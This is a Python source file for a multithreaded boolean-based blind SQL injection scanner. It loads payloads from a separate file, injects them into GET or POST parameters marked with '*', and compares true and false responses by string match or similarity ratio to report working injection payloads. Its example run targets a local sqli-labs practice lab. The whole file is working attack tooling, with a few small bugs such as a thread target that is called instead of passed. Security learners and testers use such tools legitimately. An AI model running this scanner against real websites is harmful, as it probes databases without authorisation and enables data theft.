import requests
from difflib import SequenceMatcher
from colorama import Fore, Style, Back
from urllib import parse
import threading
import queue
import sys

class Boolen_Scan():

    def __init__(self,url,method = "GET",file = "sql_injection/payload/header.txt",string = "",not_string = "",thread_num = 50,payload_num = 10):
        self.url = url
        self.method = method
        self.header_file = file
        self.string = string
        self.not_string = not_string
        self.paylaodFile = "sql_injection/payload/Boolen.txt"
        self.headers =  {
		'User-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8',
		'Accept-Language': 'Zh-CN, zh;q=0.8, en-gb;q=0.8, en-us;q=0.8',
		'Accept-Encoding': 'identity',
		'Keep-Alive': '300',
		'Connection': 'close',
		'Cache-Control': 'max-age=0',
		}
        self.queue_ = queue.Queue()
        self.thread_num = thread_num
        self.flag = 0
        self.data = {}
        self.postHeaders = {}
        self.payload_final_num = payload_num
        self.payload_temp_num = 0

    def get_page(self,payload):
        if self.method == "GET":
            payload = parse.quote(payload.encode("utf-8"))
            url = self.url.replace("*",payload)
            text = requests.get(url,headers = self.headers).content
            return text.decode("utf-8")
        else:
            self.prepare_post(payload)
            text = requests.post(self.url,headers = self.postHeaders,data = self.data).content
            return text.decode("utf-8")
    
    def prepare_post(self,payload):
        with open(self.header_file,"r") as f:
            for i in f:
                if not self.postHeaders:
                    if ":" in i.strip("\n"):
                        temp = i.strip("\n").split(":")
                        self.postHeaders[temp[0]] = temp[1].strip(" ")
                    if "&" in i.strip("\n"):
                        temp = i.strip("\n").split("&")
                        for data_ in temp:
                            data1 = data_.split("=")
                            if "*" in data1:
                                self.data[data1[0]] = payload
                            else:
                                self.data[data1[0]] = data1[1].strip(" ")
                else:
                    if ":" in i.strip("\n"):
                        temp = i.strip("\n").split(":")
                        self.postHeaders[temp[0]] = temp[1].strip(" ")
                    if "&" in i.strip("\n"):
                        temp = i.strip("\n").split("&")
                        for data_ in temp:
                            data1 = data_.split("=")
                            if "*" in data1:
                                self.data[data1[0]] = payload
                            else:
                                self.data[data1[0]] = data1[1].strip(" ")

    def scan(self):
        while not self.queue_.empty():
            TruePayload = self.queue_.get()
            TruePage = self.get_page(TruePayload)
            FalsePayload = TruePayload.replace("2","3")
            FalsePage = self.get_page(FalsePayload)
            if self.string:
                if self.string in TruePage and TruePage != FalsePage:
                    self.flag +=1 
                    self.payload_temp_num += 1
                    sys.stdout.write(Fore.LIGHTGREEN_EX + "[*]available payload {}\n".format(TruePayload))
                    if self.payload_temp_num == self.payload_final_num:
                        sys.stdout.write(Fore.LIGHTYELLOW_EX + "[*]scan finished\n")
                        sys.exit(0)
            elif self.not_string:
                if self.not_string in FalsePage and TruePage != FalsePage:
                    self.flag += 1
                    self.payload_temp_num += 1
                    sys.stdout.write(Fore.LIGHTGREEN_EX + "[*]available payload {}\n".format(TruePayload))
                    if self.payload_temp_num >= self.payload_final_num:
                        sys.stdout.write(Fore.LIGHTYELLOW_EX + "[*]scan finished\n")
                        sys.exit(0)
            else:
                ratio = self.get_ratio(FalsePayload,TruePage)
                if ratio <0.994:
                    self.flag += 1
                    self.payload_temp_num += 1
                    sys.stdout.write(Fore.LIGHTGREEN_EX + "[*]available payload {}\n".format(TruePayload))
                    if self.payload_temp_num == self.payload_final_num:
                        sys.stdout.write(Fore.LIGHTYELLOW_EX + "[*]scan finished\n")
                        sys.exit(0)
                    #print(TruePayload,FalsePayload,ratio,sep = "\n")
    
    def get_ratio(self,payload,res_text):
        seqm = SequenceMatcher()
        text = self.get_page(payload)
        seqm.set_seq1(text)
        seqm.set_seq2(res_text)
        return seqm.ratio()
    
    def payload_in_queue(self):
        with open(self.paylaodFile,"r") as f:
            for payload in f:
                TruePayload = payload.split("\n")[0]
                self.queue_.put(TruePayload)

    def start(self):
        self.payload_in_queue()
        thread_ = []
        for i in range(self.thread_num):
            t = threading.Thread(target = self.scan())
            thread_.append(t)
            t.start()
        for t in thread_: 
            t.join()
        
        if not self.flag:
            sys.stdout.write(Fore.LIGHTRED_EX + "[-]can't Boolen inject\n")
    
if __name__ == "__main__":
    a = Boolen_Scan("http://127.0.0.1/sqli-labs-master/Less-15/?id=*",thread_num = 100,method="POST")
    a.start()




